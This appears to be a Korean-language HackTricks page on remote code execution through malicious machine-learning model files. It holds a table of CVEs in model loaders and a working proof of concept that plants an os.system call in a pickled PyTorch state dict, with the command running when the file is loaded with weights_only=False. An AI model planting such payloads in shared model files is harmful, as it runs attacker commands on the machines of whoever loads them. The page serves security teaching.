# Models RCE

{{#include ../banners/hacktricks-training.md}}

## RCE에 모델 로딩하기

머신 러닝 모델은 일반적으로 ONNX, TensorFlow, PyTorch 등 다양한 형식으로 공유됩니다. 이러한 모델은 개발자의 머신이나 프로덕션 시스템에 로드되어 사용될 수 있습니다. 일반적으로 모델에는 악성 코드가 포함되지 않아야 하지만, 모델 로딩 라이브러리의 취약점이나 의도된 기능으로 인해 모델이 시스템에서 임의 코드를 실행하는 데 사용될 수 있는 경우가 있습니다.

이 글을 작성할 당시 이러한 유형의 취약점의 몇 가지 예는 다음과 같습니다:

| **프레임워크 / 도구**        | **취약점 (가능한 경우 CVE)**                                                    | **RCE 벡터**                                                                                                                           | **참조**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load`의 불안전한 역직렬화* **(CVE-2025-32434)**                                                              | 모델 체크포인트의 악성 pickle이 코드 실행으로 이어짐 ( `weights_only` 보호 장치를 우회)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 악성 모델 다운로드로 코드 실행 발생; 관리 API에서 Java 역직렬화 RCE                                        | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (안전하지 않은 YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML에서 모델 로딩 시 `yaml.unsafe_load` 사용 (코드 실행) <br> **Lambda** 레이어로 모델 로딩 시 임의의 Python 코드 실행          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite 파싱)                                                                                          | 조작된 `.tflite` 모델이 정수 오버플로우를 유발 → 힙 손상 (잠재적 RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`를 통해 모델을 로딩하면 공격자의 `__reduce__` 페이로드가 포함된 pickle이 실행됨                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (안전하지 않은 `np.load`) *논란*                                                                              | `numpy.load` 기본값으로 허용된 pickle 객체 배열 – 악성 `.npy/.npz`가 코드 실행을 유발                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (디렉토리 탐색) <br> **CVE-2024-5187** (tar 탐색)                                                    | ONNX 모델의 외부 가중치 경로가 디렉토리를 탈출할 수 있음 (임의 파일 읽기) <br> 악성 ONNX 모델 tar가 임의 파일을 덮어쓸 수 있음 (RCE로 이어짐) | |
| ONNX Runtime (설계 위험)  | *(CVE 없음)* ONNX 사용자 정의 연산 / 제어 흐름                                                                                    | 사용자 정의 연산자가 있는 모델은 공격자의 네이티브 코드를 로딩해야 함; 복잡한 모델 그래프가 논리를 악용하여 의도하지 않은 계산을 실행함   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (경로 탐색)                                                                                          | `--model-control`이 활성화된 모델 로드 API를 사용하면 상대 경로 탐색을 통해 파일을 쓸 수 있음 (예: RCE를 위한 `.bashrc` 덮어쓰기)    | |
| **GGML (GGUF 형식)**      | **CVE-2024-25664 … 25668** (다수의 힙 오버플로우)                                                                         | 잘못된 GGUF 모델 파일이 파서에서 힙 버퍼 오버플로우를 유발하여 피해 시스템에서 임의 코드 실행을 가능하게 함                     | |
| **Keras (구형 형식)**   | *(새로운 CVE 없음)* 레거시 Keras H5 모델                                                                                         | 악성 HDF5 (`.h5`) 모델이 Lambda 레이어 코드를 포함하고 있어 로딩 시 여전히 실행됨 (Keras 안전 모드가 구형 형식을 커버하지 않음 – “다운그레이드 공격”) | |
| **기타** (일반)        | *설계 결함* – Pickle 직렬화                                                                                         | 많은 ML 도구 (예: pickle 기반 모델 형식, Python `pickle.load`)는 완화되지 않는 한 모델 파일에 포함된 임의 코드를 실행함 | |

또한, [PyTorch](https://github.com/pytorch/pytorch/security)에서 사용되는 것과 같은 Python pickle 기반 모델은 `weights_only=True`로 로드되지 않으면 시스템에서 임의 코드를 실행하는 데 사용될 수 있습니다. 따라서 테이블에 나열되지 않은 경우에도 모든 pickle 기반 모델은 이러한 유형의 공격에 특히 취약할 수 있습니다.

예시:

- 모델 생성:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- 모델 로드:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
{{#include ../banners/hacktricks-training.md}}
